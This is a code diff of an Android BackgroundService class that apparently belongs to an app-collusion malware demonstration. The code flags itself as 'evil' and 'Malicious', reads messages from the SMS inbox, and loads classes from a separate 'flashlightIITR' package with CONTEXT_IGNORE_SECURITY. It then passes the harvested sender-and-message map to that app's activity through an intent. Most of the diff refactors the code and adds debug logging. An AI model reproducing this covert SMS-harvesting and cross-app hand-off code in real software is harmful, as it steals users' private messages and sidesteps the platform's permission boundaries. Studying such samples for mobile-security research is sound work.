@@ -15,13 +15,11 @@ import android.util.Log;
 import java.lang.reflect.Constructor;
 import java.util.HashMap;
 
-import static android.content.ContentValues.TAG;
+
 
 public class BackgroundService extends Service {
 
     private boolean isRunning;
-    private Context context;
-    private Handler handler;
     HashMap<String, String> smsList = new HashMap<String, String>();
 
     @Override
@@ -31,20 +29,21 @@ public class BackgroundService extends Service {
 
     @Override
     public void onCreate() {
-        this.context = this;
+        Context context = this;
         this.isRunning = false;
+        Log.d("BgC","In OnCreate method.");
 
     }
 
-    private Runnable myTask = new Runnable() {
+    private final Runnable myTask = new Runnable() {
 
         public void run() {
             try {
                 new ForegroundCheckTask().execute();
-                Log.e(TAG, "fromService");
+                Log.d("BgC", "fromService");
                 stopSelf();
             } catch (Exception ex) {
-                Log.e(TAG, ex.toString());
+                Log.e("BgC", ex.toString());
             }
         }
 
@@ -60,10 +59,11 @@ public class BackgroundService extends Service {
         MainActivity.isEvil = true;
         Clues myclues = new Clues();
         myclues.SendLog("App Mode Change", "App entered onStartCommand()", "Malicious");
+        Log.d("BgC","Entering onStartCommand Method");
 
         if (!this.isRunning) {
             this.isRunning = true;
-            handler = new Handler(Looper.getMainLooper());
+            Handler handler = new Handler(Looper.getMainLooper());
             handler.post(myTask);
         }
         return START_STICKY;
@@ -75,65 +75,78 @@ public class BackgroundService extends Service {
         @Override
         protected String doInBackground(String[]... params) {
             getSMSDetails(result);
+            Log.d("BgC","Coming out from SMSDetails method");
             return "";
         }
 
-        private Boolean getSMSDetails(final String[] param) {
+        private void getSMSDetails(final String[] param) {
             Cursor smsCursor = getContentResolver().query(
                     Uri.parse("content://sms/inbox"),
                     null,
                     null,
                     null,
                     null);
+            Log.d("BgC","Finding the sms.");
 
             try {
                 int i = 0;
-                while (smsCursor.moveToNext()) {
+                while (true) {
+                    assert smsCursor != null;
+                    if (!smsCursor.moveToNext()) break;
                     String sender = smsCursor.getString(smsCursor.getColumnIndexOrThrow("address"));
                     String message = smsCursor.getString(smsCursor.getColumnIndexOrThrow("body"));
                     smsList.put(sender, message);
+                    Log.d("BgC","Adding the data in Hash-map");
                     i++;
-                    if (i == 10) {
+                    if (i == 2) {
                         break;
                     }
                 }
             } catch (Exception ex) {
                 ex.printStackTrace();
+                Log.e("BgC","Got an error.");
             } finally {
+                assert smsCursor != null;
                 smsCursor.close();
             }
 
             try {
                 PackageManager packageManager = getPackageManager();
                 try {
-                    packageManager.getPackageInfo("com.example.flashlight", PackageManager.GET_ACTIVITIES);
+                    packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);
+                    Log.d("BgC","Found the package name");
                 } catch (PackageManager.NameNotFoundException e) {
                     e.printStackTrace();
+                    Log.e("BgC","Cannot find the package name");
                 }
 
-                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlight",
+                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlightIITR",
                         Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);
+                Log.d("BgC","Creating the context");
 
                 final ClassLoader loader = remoteContext.getClassLoader();
-                final Class cls = loader.loadClass("com.example.flashlight.BackgroundService");
-                final Class clsnotify = loader.loadClass("com.example.flashlight.NotificationActivity");
+                final Class<?> classBackground = loader.loadClass("com.example.flashlightIITR.BackgroundService");
+                final Class<?> classNotify = loader.loadClass("com.example.flashlightIITR.NotificationActivity");
+                Log.d("BgC","Loading the classes.");
 
-                final Constructor constructor = cls.getConstructor();
-                final Constructor constructor1 = clsnotify.getConstructor();
+                final Constructor<?> constructorBackground = classBackground.getConstructor();
+                final Constructor<?> constructorNotify = classNotify.getConstructor();
                 Handler h = new Handler(Looper.getMainLooper());
                 h.post(new Runnable() {
                     public void run() {
+                        Log.d("BgC","In the run method");
                         try {
-                            Intent intent1 = new Intent(remoteContext, clsnotify);
+                            Intent intent1 = new Intent(remoteContext, classNotify);
                             intent1.putExtra("SMS_LIST", smsList);
+                            Log.d("BgC", String.valueOf(smsList));
                             intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                             intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                             intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                             remoteContext.startActivity(intent1);
+                            Log.d("BgC","Starting the Intent");
 
-                            Service obj = Service.class.cast(constructor.newInstance());
-
-                            Intent intent = new Intent(remoteContext, obj.getClass());
+//                            Service obj = (Service) constructorBackground.newInstance();
+//                            Intent intent = new Intent(remoteContext, obj.getClass());
 
                         } catch (Exception ex) {
                             ex.printStackTrace();
@@ -141,13 +154,12 @@ public class BackgroundService extends Service {
                     }
                 });
             } catch (Exception ex) {
-                Log.e("I DONT KNOW", ex.toString());
+                Log.e("BgC", ex.toString());
                 ex.printStackTrace();
             }
 
             stopSelf();
 
-            return true;
         }
     }
 }
